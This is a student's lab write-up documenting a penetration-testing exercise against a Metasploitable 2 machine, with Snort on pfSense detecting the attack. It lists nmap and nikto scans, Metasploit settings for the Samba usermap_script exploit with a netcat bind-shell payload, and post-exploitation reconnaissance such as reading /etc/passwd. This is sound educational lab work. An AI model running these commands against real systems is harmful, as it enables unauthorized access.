# 🛠️ Tool & System Analysis

This section documents the cybersecurity tools used in the lab and the systems configured to support penetration testing and threat detection.

## Kali Linux Tools Used

Below are the tools from Kali Linux that I used in this lab along with simple explanations of what they do:

### 🔍 Nmap
**Command Used:** `nmap -sS 192.168.12.14`
Nmap is a network scanning tool that helped me discover open ports and services on the Metasploitable 2 target. The `-sS` flag tells Nmap to perform a stealthy SYN scan. I used it first to understand what was running on the target machine.

### 🧰 Metasploit Framework (Kali)
**Command Used:**
```
use exploit/multi/samba/usermap_script
set payload cmd/unix/bind_netcat
set RHOSTS 192.168.12.14
set RPORT 139
run
```
Metasploit is a powerful framework for developing and executing exploits. I used it to exploit a vulnerability in Samba (CVE-2007-2447) on the Metasploitable 2 target. The exploit created a bind shell, allowing me to connect and get command-line access. The session was established when Metasploit confirmed a successful shell connection.

### 🕵️ Nikto
**Command Used:** `nikto -h 192.168.12.14`
Nikto is a web vulnerability scanner. I ran this command to scan for known vulnerabilities on the web server running on the Metasploitable 2 machine. It checked for outdated software, misconfigurations, and dangerous scripts.

### 📡 Netcat
Netcat was used as part of the bind shell payload in Metasploit. It creates connections between machines using TCP or UDP, making it great for reverse or bind shells. In this lab, it allowed my attacker machine to interact with the target once the exploit was successful.

### 🧠 whoami / id / uname -a / ifconfig / cat / ls / ps / netstat
Once inside the target, I used basic Linux commands to learn more about the system:
- `whoami`: Showed that I had root access.
- `id`: Gave detailed user/group info.
- `uname -a`: Displayed system and kernel information.
- `ifconfig`: Displayed network interface settings.
- `cat /etc/passwd`: Showed user accounts.
- `ls /home`: Showed available home directories.
- `ps aux`: Listed all running processes.
- `netstat -antp`: Showed network connections and listening services.

These commands helped confirm I was on the right machine and gave me information that would be useful if I continued with post-exploitation tasks.

---

## 🧱 Snort IDS/IPS and pfSense

Snort was installed on the pfSense firewall and used to monitor traffic on the `server_net` (192.168.12.x). It acted as an Intrusion Detection System (IDS) by analyzing packets and generating alerts when it recognized potentially malicious activity, like the Samba exploit I ran. Snort rules triggered alerts that were viewable in the pfSense web interface under "Snort Alerts."

pfSense is an open-source firewall used to separate different segments of the network. I set up 3 LAN interfaces and 1 WAN interface:
- WAN: External network for updates.
- LAN1: attacker_net for the Kali machine.
- LAN2: server_net for the Metasploitable 2 machine.
- LAN3: management_net (not directly used in this lab).

Snort was specifically configured to monitor traffic from LAN2, where the vulnerable server lived. This allowed me to simulate a real detection setup where attacks would trigger alerts without disrupting legitimate traffic.
